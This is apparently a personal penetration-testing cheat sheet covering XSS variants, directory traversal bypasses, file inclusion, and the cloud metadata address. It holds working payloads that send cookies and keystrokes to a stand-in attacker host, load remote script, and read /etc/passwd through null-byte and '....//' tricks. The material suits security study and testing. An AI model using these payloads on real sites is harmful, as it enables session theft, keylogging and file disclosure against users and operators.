# Penetration Testing Tips


## XSS Attacks

### Payload

#### Proof of Concept

```html
<script>alert('XSS')</script>
```

#### Session stealing

Steal the session ID in `document.cookie` and send it to an API owned by the attacker.  
The `btoa(str)` JS function (Binary to ASCII) encodes the cookie in Base64.

```html
<script>fetch('https://attacker-domain.com/steal?cookie=' + btoa(document.cookie))</script>
```

#### Key logger

Similar to session stealing, but instead of a cookie send each keystroke to an API owned by the attacker.

```html
<script>document.onkeypress = function(e) { 
    fetch('https://attacker-domain.com/log?key=' + btoa(e.key));
}</script>
```

### Reflected XSS

Reflected XSS is a XSS vulnerability where a webpage displays in its HTML a string from the HTTP request
(for ex an URL parameter) without validation.  
This can happen for an error page for example, taking the error message as a parameter.  

Reflected XSS can be exploited by passing a custom script in the URL :
```commandline
http:// vulnerable-website.com?param=<script src="https://attacker-domain.com/payload.js"></script>
```

### Stored XSS

Stored XSS is a XSS vulnerability where the payload is stored by the website in a database (for example in a blog comment).  
It gets displayed for every user checking the website, so reaches more users than reflected XSS.  
However it is easier to detect than reflected XSS, since the payload is stored in the database.
 

### Blind XSS

Blind XSS is a XSS vulnerability where the attacker can inject a payload that is executed, but cannot test it himself.  
This happens for example if we create a support request which body is not sanitized, and this body is used as-is
to create a ticket in a ticketing system (JIRA, FreshDesk...).  
In that case, the payload should report to an HTTP API when executed, to transmit the stolen info.

**XSS Hunter Express** can be used to perform Blind XSS attacks, it will capture cookies, URK, page content...


## Directory Traversal

A directory traversal exposes files from the web server by exploiting a query parameters containing a file name.  
We can use the **dot-dot-attack** to expose files outside the intended resource folder.

#### Bypass a suffix appended to the file name by the web-server

A **NULL-byte injection** can by-pass a mechanism appending a suffix to the file name (like forcing an extension).  
The NULL byte is represented by `%00` or `0x00`.  
For example if a parameter `file=EN` returns the file `EN.php`, we can use `file=../../../../etc/passwd%00` to ignore the appended `.php`  
This NULL-byte injection is fixed in PHP 5.3.4.

#### Bypass the replacement of ../ by an empty string

If the sanitization replaces `../` by an empty string, it usually does a single pass.  
We can trick it by passing `....//....//etc/passwd`, after sanitization it will become `../../etc/passwd`.

#### LFI / RFI (Local/Remote File Injection)

When the web server can only return local files, it is a LFI.  
If the web server queries the URL of the input file, it is a RFI.  
In case of a RFI, we can force the web server to execute a malicious PHP file from a server owned by the attacker.  
This results in a RCE vulnerability.


## Run a local webserver

Run a local web server on port 8000 delivering files in its execution folder : 
```commandline
python -m http.server
```


## Special IP addresses 

**169.254.169.254** : link-local address used by cloud providers (AWS, GCP...) to provide metadata on the running instance.